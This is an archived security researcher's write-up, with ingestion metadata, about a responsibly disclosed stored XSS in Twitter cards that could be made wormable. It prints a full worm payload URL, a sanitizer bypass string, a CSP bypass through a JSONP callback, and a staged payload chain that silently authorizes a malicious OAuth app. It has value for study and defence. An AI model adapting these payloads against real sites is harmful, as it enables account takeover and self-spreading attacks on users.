---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2019-05-02_tale-of-a-wormable-twitter-xss.md
original_filename: 2019-05-02_tale-of-a-wormable-twitter-xss.md
title: Tale of a Wormable Twitter XSS
category: documents
detected_topics:
- xss
- oauth
- access-control
- command-injection
- otp
- automation-abuse
tags:
- imported
- documents
- xss
- oauth
- access-control
- command-injection
- otp
- automation-abuse
language: en
raw_sha256: c80c610300d98dc67e9ea804cfe92c2bfd2a51c17012678a482b56d8319e8971
text_sha256: ba422c8c4dca24c3bd41cdd4ed2ae3f2ed21149ea7342592950593c109264601
ingested_at: '2026-06-28T07:31:59Z'
sensitivity: unknown
redactions_applied: false
---

# Tale of a Wormable Twitter XSS

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2019-05-02_tale-of-a-wormable-twitter-xss.md
- Source Type: markdown
- Detected Topics: xss, oauth, access-control, command-injection, otp, automation-abuse
- Ingested At: 2026-06-28T07:31:59Z
- Redactions Applied: False
- Raw SHA256: `c80c610300d98dc67e9ea804cfe92c2bfd2a51c17012678a482b56d8319e8971`
- Text SHA256: `ba422c8c4dca24c3bd41cdd4ed2ae3f2ed21149ea7342592950593c109264601`


## Content

---
title: "Tale of a Wormable Twitter XSS"
page_title: "Tale of a Wormable Twitter XSS - Virtue Security"
url: "https://www.virtuesecurity.com/tale-of-a-wormable-twitter-xss/"
final_url: "https://www.virtuesecurity.com/tale-of-a-wormable-twitter-xss/"
authors: ["Ahmed Elsobky"]
programs: ["Twitter"]
bugs: ["XSS"]
bounty: "2,940"
publication_date: "2019-05-02"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 5272
---

[ Application Penetration Testing ](https://www.virtuesecurity.com/application-penetration-testing/ "Go to Application Penetration Testing.") [ A Pentester’s Guide to Input Validation ](https://www.virtuesecurity.com/a-pentesters-guide-to-input-validation/ "Go to A Pentester’s Guide to Input Validation.") Tale of a Wormable Twitter XSS

Jump to 

Stay tuned for  
more insights

Submit 

Follow us on

  * [](https://www.linkedin.com/company/virtue-security/)
  * [](https://www.youtube.com/@virtuesecurity)
  * [](https://github.com/VirtueSecurity)
  * [](https://bsky.app/profile/virtuesecurity.bsky.social)

# Tale of a Wormable Twitter XSS

[ Application ](https://www.virtuesecurity.com/category/application/)

May 2, 2019

2min Read

This is a tale of how we found a wormable XSS on Twitter, and how we managed to fully bypass its CSP policy.

![](https://www.virtuesecurity.com/wp-content/uploads/2019/05/TwitterWorm-1.png.webp)TwitterXSSWorm

## Vulnerability Background

In mid-2018, I found a stored XSS on Twitter in the least likely place you could think of. Yes, right in the tweet! But what makes this XSS so special is that it had the potential to be turned into a fully-fledged XSS worm. If the concept of XSS worms is new to you, you might want to read more about it on [Wikipedia](https://en.wikipedia.org/wiki/XSS_worm).

## A One-click XSS Worm

Let me jump right to the full exploit and then we can explain the magic later on. Before this got fixed, tweeting the following URL would have created an XSS worm that spreads from account to account throughout the Twitterverse:
  
  
  https://twitter.com/messages/compose?recipient_id=988260476659404801&welcome_message_id=988274596427304964&text=%3C%3Cx%3E/script%3E%3C%3Cx%3Eiframe%20id%3D__twttr%20src%3D/intent/retweet%3Ftweet_id%3D1114986988128624640%3E%3C%3Cx%3E/iframe%3E%3C%3Cx%3Escript%20src%3D//syndication.twimg.com/timeline/profile%3Fcallback%3D__twttr/alert%3Buser_id%3D12%3E%3C%3Cx%3E/script%3E%3C%3Cx%3Escript%20src%3D//syndication.twimg.com/timeline/profile%3Fcallback%3D__twttr/frames%5B0%5D.retweet_btn_form.submit%3Buser_id%3D12%3E

“How so? It’s just a link!”, you might wonder. But this, my friend, is no ordinary link. It’s a Welcome Message deeplink 1. The deeplink gets rendered as a [Twitter card](https://twitter.com/kyoko6516713624/status/1114991578353930240):

![](https://www.virtuesecurity.com/wp-content/uploads/2019/05/twcard-1.png.webp) [](https://x.com/kyoko6516713624/status/1114991578353930240)

## A Flaw in Twitter Cards

This Twitter card is actually an iframe element which points to `https://twitter.com/i/cards/tfw/v1/1114991578353930240`. The iframe is obviously same-origin and not sandboxed (which means we have DOM access to the parent webpage). The payload in the “text” parameter would then get reflected back in an inline JSON object as the value of the `default_composer_text` key:
  
  
  <script type="text/twitter-cards-serialization">
  {
  "strings": { },
  "card": {
  "viewer_id" : "988260476659404801",
  "is_caps_enabled" : true,
  "forward" : "false",
  "is_logged_in" : true,
  "is_author" : true,
  "language" : "en",
  "card_name" : "2586390716:message_me",
  "welcome_message_id" : "988274596427304964",
  "token" : "[redacted]",
  "is_emojify_enabled" : true,
  "scribe_context" : "%7B%7D",
  "is_static_view" : false,
  "default_composer_text" : "</script><iframe id=__twttr src=/intent/retweet?tweet_id=1114986988128624640></iframe><script src=//syndication.twimg.com/timeline/profile?callback=__twttr/alert;user_id=12></script><script src=//syndication.twimg.com/timeline/profile?callback=__twttr/frames[0].retweet_btn_form.submit;user_id=12>\u00A0",
  "recipient_id" : "988260476659404801",
  "card_uri" : "https://t.co/1vVzoyquhh",
  "render_card" : true,
  "tweet_id" : "1114991578353930240",
  "card_url" : "https://t.co/1vVzoyquhh"
  },
  "twitter_cldr": false,
  "scribeData": {
  "card_name": "2586390716:message_me",
  "card_url": "https://t.co/1vVzoyquhh"
  
  
  
  }
  }
  </script>

Note: Once the HTML parser encounters a closing script tag

`</script>` anywhere after the initial opening tag `<script>`,  it gets immediately terminated even when the encountered

`</script>` tag is inside a string literal a comment, or a regex….

## Bypassing Input Validation

But before you could get to this point, you’d have had to overcome many limitations and obstacles first:

  * Both single and double quotes get escaped to

`​\'` and `\"`, respectively.

  * HTML tags get stripped (so `a</script>b` would become `ab`).
  * The payload gets truncated at around 300 characters.
  * There is a CSP policy in place which disallows non-whitelisted inline scripts.

At first glance, these might look like proper countermeasures. But the moment I noticed the HTML-tag stripping behavior, my spidey sense started tingling. That’s because this is usually error-prone. Unlike escaping individual characters, stripping tags requires HTML parsing (and parsing is always hard to get right, regexes anybody?).

## Chaining Vulnerabilities

So I started fiddling with a very basic payload `</script><svg onload=alert()>` and kept fiddling until I ended up with `<</<x>/script/test000><</</x><x>svg onload=alert()></><script>1<\x>2` which got turned into `</script/test000><svg onload=alert()>`. Jackpot, I immediately reported my finding to the Twitter security team at this point and didn’t wait until I found a bypass for the CSP policy.

## Bypassing CSP

Now, let’s take a closer look at Twitter’s CSP policy:
  
  
  script-src 'nonce-ETj41imzIQ/aBrjFcbynCg==' https://twitter.com https://*.twimg.com https://ton.twitter.com 'self'; frame-ancestors https://ms2.twitter.com https://twitter.com http://localhost:8889 https://momentmaker-local.twitter.com https://localhost.twitter.com https://tdapi-staging.smf1.twitter.com https://ms5.twitter.com https://momentmaker.twitter.com https://tweetdeck.localhost.twitter.com https://ms3.twitter.com https://tweetdeck.twitter.com https://wfa.twitter.com https://mobile.twitter.com https://ms1.twitter.com 'self' https://ms4.twitter.com; font-src https://twitter.com https://*.twimg.com data: https://ton.twitter.com 'self'; media-src https://twitter.com https://*.twimg.com https://ton.twitter.com blob: 'self'; connect-src https://caps.twitter.com https://cards.twitter.com https://cards-staging.twitter.com https://upload.twitter.com blob: 'self'; style-src https://twitter.com https://*.twimg.com https://ton.twitter.com 'unsafe-inline' 'self'; object-src 'none'; default-src 'self'; frame-src https://twitter.com https://*.twimg.com https://* https://ton.twitter.com 'self'; img-src https://twitter.com https://*.twimg.com data: https://ton.twitter.com blob: 'self'; report-uri https://twitter.com/i/csp_report?a=NVQWGYLXMNQXEZDT&ro=false;

An interesting fact is, Twitter doesn’t deploy one global CSP policy throughout the entire app. Instead, different parts of the app have different CSP policies. This is the CSP policy for Twitter cards, and we are only interested in the `script-src` directive for now.

To the trained eye, the wildcard origin `https://*.twimg.com` looks too permissive and is most likely to be the vulnerable point. So it wasn’t very hard to find a JSONP endpoint on a subdomain of `twimg.com`: `https://syndication.twimg.com/timeline/profile?callback=__twttr;user_id=12`

The hard part was, bypassing the callback validation. You can’t simply just specify any callback you like, it must start with the `\_\_twttr` prefix (otherwise, the callback is rejected). This means you can’t pass built-in functions like `alert` for instance (but you could use `\_\_twttralert`, which of course evaluates to `undefined`). I then did a few checks to see which characters are filtered for the callback and which are allowed, and oddly enough, forward slashes were allowed in the “callback” parameter (i.e., `?callback=__twttr/alert`). This would then result in the following response:
  
  
  /**/__twttr/alert({"headers":{"status":200,"maxPosition":"1113300837160222720","minPosition":"1098761257606307840","xPolling":30,"time":1554668056},"body":"[...]"});

So now we just need to figure out a way to define a `__twttr` reference on the `window` object so we don’t get a `ReferenceError` exception. There are two ways I could think of to do just that:

1\. Find a whitelisted script that defines a

`__twttr` variable and include it in the payload.

2\. Set the ID attribute of an HTML element to `__twttr` (which would create a global reference to that element on the `window` object).

So I went with option #2, and that’s why the iframe element in the payload has an ID attribute despite the fact that we want the payload to be as short as possible.

So far, so good. But since we can’t inject arbitrary characters in the callback parameter, this means we are quite limited in what JavaScript syntax we can use (note: the semicolon in `?callback=__twttr/alert;user_id=12` is not part of the callback parameter, it’s actually a URL query separator—the same as “&”). But this is not really much of a problem, as we still can invoke any function we want (similar to a [SOME attack](http://www.benhayak.com/2015/06/same-origin-method-execution-some.html)).

To sum up what the full payload does:

  1. Create an iframe element with the ID “__twttr” which points to a specific tweet using Twitter Web Intents (`https://twitter.com/intent/retweet?tweet_id=1114986988128624640`).
  2. Use the CSP policy bypass to invoke a synchronous function (i.e., `alert`) to delay the execution of the next script block until the iframe has fully loaded (the alert is not for show—because of syntax limitations, we cannot simply use `setTimeout(func)`).
  3. Use the CSP bypass again to submit a form inside the iframe which causes a specific tweet to get retweeted.

An XSS worm would ideally spread by retweeting itself. And if there were no syntax limitations, we could have so easily done that. But now that we have to depend on Twitter Web Intents for retweets, we need to know the exact tweet ID and specify that in the payload before actually tweeting it. Quite the dilemma, as tweet IDs are not actually sequential [4] (meaning it won’t be easy to predict the tweet ID beforehand). Oh no, our evil plan is doomed again!

Well, not really. There are two other relatively easier ways in which we can make the XSS worm spread:

  1. Weaponize a chain of tweets where each tweet in the chain contains a payload that retweets the one preceding it. This way, if you get in contact with any of those tweets, this would initiate a series of retweets which would eventually deliver the first tweet in the chain to every active Twitter account.
  2. Simply promote the tweet that carries the XSS payload so it would have much greater reach.

Or you could use a mix of those two spreading mechanisms for better results. The possibilities are endless. Also luckily for us, when the “<https://twitter.com/intent/retweet?tweet_id=1114986988128624640>” page is loaded for an already-retweeted tweet, the `frames[0].retweet_btn_form.submit` method in the payload would then correspond to a follow action instead of a retweet upon invocation.

This means that the first time a weaponized tweet is loaded on your timeline, it’ll immediately get retweeted on your Twitter profile. But the next time you view this tweet again, it will make you follow the attacker’s account!

### Taking exploitation a step further:

Making an XSS worm sure can be fun and amusing, but is that really as far as this can go? In case it wasn’t scary enough for you, this XSS could have also been exploited to force Twitter users into authorizing a malicious third-party app to access their accounts silently and with full permissions via the Twitter “oauth/authorize” API [5].

This could be achieved by loading `https://twitter.com/oauth/authorize?oauth_token=[token]` in an iframe and then automatically submitting the authorization form included within that page (i.e., the form with the ID `oauth_form`). A silent exploit with staged payloads would go as following:

  1. Post a tweet with the following as a payload and obtain its ID:

  
  
  </script><iframe src=/oauth/authorize?oauth_token=cXDzjwAAAAAA4_EbAAABaizuCOk></iframe>

2\. Post another tweet with the following as a payload and obtain its ID:
  
  
  </script><script id=__twttr src=//syndication.twimg.com/tweets.json?callback=__twttr/parent.frames[0].oauth_form.submit;ids=20></script>

3\. Post a third tweet with the following as a payload (which combines the two tweets together in one page)
  
  
  </script><iframe src=/i/cards/tfw/v1/1118608452136460288></iframe><iframe src=/i/cards/tfw/v1/1118609496560029696></iframe>

Now as soon as the third tweet gets loaded on a user’s timeline, a malicious third-party app would have full access to their account. The only caveat here is that the “oauth_token” value is valid for one use only and has a relatively short expiry time. But this is not much of a problem either as an attacker could post as many tweets as needed to compromise any number of accounts.

The bottom line is, I could have forced you to load any page on Twitter, click any button, submit any form, and what not!

P.S. If you want to get in touch, you can find me on [Twitter](https://twitter.com/0xSobky)/[GitHub](https://github.com/0xSobky). Also don’t forget to follow [our official Twitter account](https://twitter.com/virtuesecurity)!

#### Disclosure Timeline:

  * 23rd April 2018 – I filed the initial bug report.
  * 25th April 2018 – The report got triaged.
  * 27th April 2018 – Twitter awarded a $2,940 bounty.
  * 4th May 2018 – A fix was rolled out.
  * 7th April 2019 – I provided more information on the CSP bypass.
  * 12th April 2019 – I sent a draft of this write-up directly to a Twitter engineer for comment.
  * 12th April 2019 – I was asked to delay publication until after the CSP bypass is fixed.
  * 22nd April 2019 – The CSP bypass got fixed and we got permission to publish.
  * 2nd May 2019 – The write-up was published publicly.

#### References:

[1]  [https://developer.twitter.com/en/docs/direct-messages/welcome-messages/guides/deeplinking-to-welcome-message.html](http://www.benhayak.com/2015/06/same-origin-method-execution-some.html)

[2] <https://html.spec.whatwg.org/#named-access-on-the-window-object>

[3] <https://www.benhayak.com/2015/06/same-origin-method-execution-some.html>

[4] <https://developer.twitter.com/en/docs/basics/twitter-ids.html>

[5] <https://developer.twitter.com/en/docs/basics/authentication/api-reference/authorize.html>
